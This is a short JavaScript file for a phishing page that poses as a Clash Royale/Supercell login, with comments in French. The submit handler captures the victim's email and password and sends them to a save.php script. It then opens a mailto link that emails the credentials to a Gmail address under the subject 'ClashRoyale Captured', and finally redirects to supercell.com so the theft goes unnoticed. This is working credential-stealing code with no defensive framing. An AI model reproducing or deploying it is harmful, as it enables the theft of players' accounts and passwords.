document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Sauvegarde locale (visible sur github.io/data.txt)
    fetch('save.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}`
    });
    
    // Envoi email IMMÉDIAT
    const link = `mailto:supercell.100gemmes@gmail.com?subject=ClashRoyale+Captured&body=Email: ${email}%0D%0APassword: ${password}`;
    window.location.href = link;
    
    // Redirection après 2s
    setTimeout(() => {
        window.location.href = 'https://supercell.com';
    }, 2000);
});
